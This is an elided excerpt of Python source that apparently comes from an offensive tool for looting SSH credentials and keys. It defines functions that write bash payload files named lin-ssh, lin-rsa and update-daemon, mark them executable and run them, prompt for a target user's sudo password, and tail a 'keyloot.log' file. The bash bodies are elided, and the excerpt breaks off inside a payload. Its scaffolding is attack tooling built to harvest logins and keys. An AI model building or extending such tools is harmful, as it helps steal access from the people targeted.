...
staging_area = f'{install_directory}/payloads'
...
def tcp_options():
    print('\nDefinitions:\n'
          ...
          '     https-server-port = Port for payloads HTTP server\n'
          '\n'
          '--------------------------------------------------------------------------------'
          '\n'
          '\nTarget Options:\n'
...
def http_on():
    if thief.http_server is None:
        repl.error("You must set http-server-port")
    else:
...
def linssh_pw():
    ...
    with open('payloads/lin-ssh', 'w') as payload:
        payload.write(f"""\
#!/bin/bash
...
""")
        payload.close()
    os.system('chmod +x payloads/lin-ssh')
    os.system(f'gnome-terminal -- tail -f {install_directory}/keyloot.log &')
    os.system(f'./payloads/lin-ssh')


def linssh_rsa():
    sudo_pw = input(Palette.YELLOW.format("If required, enter the user's sudo password: "))
    with open('payloads/lin-rsa', 'w') as payload:
        payload.write(f"""\
#!/bin/bash
...
""")
        payload.close()
    os.system('chmod +x payloads/lin-rsa')
    os.system(f'gnome-terminal -- tail -f {install_directory}/keyloot.log &')
    os.system(f'./payloads/lin-rsa')
...
def tcp_payloads():
    if thief.module == 'linux-tcp':
        ...
        with open('payloads/update-daemon', 'w') as payload:
            payload.write(f'''\
            #!/bin/bash
